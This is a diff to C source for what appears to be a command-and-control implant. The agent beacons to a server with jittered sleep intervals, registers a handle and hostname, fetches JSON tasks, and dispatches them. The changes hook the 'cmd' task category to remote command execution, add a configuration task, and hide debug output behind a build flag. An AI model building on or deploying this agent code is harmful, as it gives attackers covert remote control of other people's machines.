@@ -18,8 +18,8 @@ struct {
     struct timespec mean_delay;
     struct timespec jitter; //max jitter
 } beacon_config = {
-    .mean_delay = {.tv_sec = 3, .tv_nsec = 0},
-    .jitter = {.tv_sec = 0, .tv_nsec = 0}
+    .mean_delay = {.tv_sec = DEFAULT_DELAY_S, .tv_nsec = DEFAULT_DELAY_NS},
+    .jitter = {.tv_sec = DEFAULT_JITTER_S, .tv_nsec = DEFAULT_JITTER_NS}
 };
 
 //misc
@@ -101,7 +101,7 @@ char *agent_init(void) {
         hostname[0] = '\0';
         //return NULL;
     }
-    json_t *post_json = json_pack("{s:s, s:s}", "handle", AGENT_HANDLE, "hostname", hostname);
+    json_t *post_json = json_pack("{s:s, s:s}", "handle", AGENT_HANDLE, "hostname", "myhostname");
     char *post_str = json_dumps(post_json, 0);
     json_decref(post_json);
     if (!post_str) {
@@ -194,7 +194,9 @@ void *beacon_routine(void *) {
     while (1) {
         pthread_mutex_lock(&conf_mutex);
         struct timespec t = compute_sleep_time(beacon_config.mean_delay, beacon_config.jitter);
-        //printf("\nnap sec %lld nap nsec %lld\n", (long long)t.tv_sec, (long long)t.tv_nsec);
+#ifdef DEBUG
+        printf("\nnap %llds %lldns\n", (long long)t.tv_sec, (long long)t.tv_nsec);
+#endif
         clock_nanosleep(CLOCK_MONOTONIC, 0, &t, NULL);
         pthread_mutex_unlock(&conf_mutex);
         //get_task
@@ -218,8 +220,10 @@ void *beacon_routine(void *) {
             //continue;
         }
         curl_easy_cleanup(curl);
-        fwrite(response_buf.response, 1, response_buf.size, stdout); //DELETE ME
-        printf("\n"); //DELETE ME
+#ifdef DEBUG
+        fwrite(response_buf.response, 1, response_buf.size, stdout);
+        printf("\n");
+#endif
         //parsing response (task array) into json
         json_error_t jerror;
         json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
@@ -265,7 +269,7 @@ void *task_routine(void *) {
         //pop task from array (FIFO)
         pthread_mutex_lock(&tasks_mutex);
         while (json_array_size(tasks) == 0) {
-            printf("\n no tasks, waiting...\n"); //DELETE ME
+            //no tasks, waiting
             pthread_cond_wait(&got_task_cond, &tasks_mutex);
         }
         json_t *cur_task = json_array_get(tasks, 0);
@@ -274,16 +278,25 @@ void *task_routine(void *) {
         pthread_mutex_unlock(&tasks_mutex);
         //got new task. unpacking it
         char *category = NULL; //lifetime until task exists
-        char *task_id = NULL; //lifetime until task exists
-        json_t *options = NULL; //lifetime extends, must be decref'd manually
-        rc = json_unpack(cur_task, "{s:s, s:s, s:O}",
-            "category", &category, "uuid", &task_id, "options", &options);
+        char *task_id = NULL;
+        char *options_str = NULL;
+        rc = json_unpack(cur_task, "{s:s, s:s, s:s}",
+            "category", &category, "uuid", &task_id, "options", &options_str);
         if (rc) {
 #ifdef DEBUG
             fprintf(stderr, "error: json unpack.\n");
 #endif
             json_decref(cur_task);
-            json_decref(options);
+            //continue; //this would skip that task
+            //return NULL;
+            exit(EXIT_FAILURE);
+        }
+        json_error_t error;
+        json_t *options = json_loads(options_str, 0, &error);
+        if (!json_is_object(options)) {
+#ifdef DEBUG
+            fprintf(stderr, "options should be an object\n");
+#endif
             //continue; //this would skip that task
             //return NULL;
             exit(EXIT_FAILURE);
@@ -295,10 +308,10 @@ void *task_routine(void *) {
             result = task_ping(options);
         }
         else if (strcasecmp(category, "cmd") == 0) {
-
+            result = task_cmd(options);
         }
         else if (strcasecmp(category, "conf") == 0) {
-
+            result = task_conf(options);
         }
         else { //no match
             result = json_pack("s:s", "error", "unsupported task category");
